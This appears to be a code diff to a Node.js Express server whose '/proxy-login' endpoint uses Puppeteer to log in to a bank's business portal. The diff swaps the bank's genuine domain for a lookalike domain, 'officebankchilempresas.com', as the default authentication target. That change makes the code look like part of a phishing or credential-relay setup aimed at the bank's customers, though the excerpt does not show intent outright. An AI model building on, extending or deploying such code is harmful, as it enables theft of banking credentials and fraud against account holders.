@@ -6,6 +6,9 @@ const puppeteer = require("puppeteer");
 // Si tu Node es <18, instala node-fetch y descomenta:
 // const fetch = require("node-fetch");
 
+// Host objetivo para el flujo de autenticación (configurable por env)
+const AUTH_SITE = process.env.AUTH_SITE || 'https://officebankchilempresas.com';
+
 const app = express();
 app.use(cors());
 app.use(express.json());
@@ -115,7 +118,9 @@ app.post("/proxy-login", async (req, res) => {
         }
       });
 
-      await page.goto('https://empresas.officebanking.cl', { waitUntil: 'networkidle2' });
+      // Ir al sitio objetivo (configurable por AUTH_SITE)
+      console.log(`Navegando a sitio de autenticación: ${AUTH_SITE}`);
+      await page.goto(AUTH_SITE, { waitUntil: 'networkidle2' });
       await page.waitForSelector('iframe');
       const frameHandle = await page.$('iframe');
       const frame = await frameHandle.contentFrame();
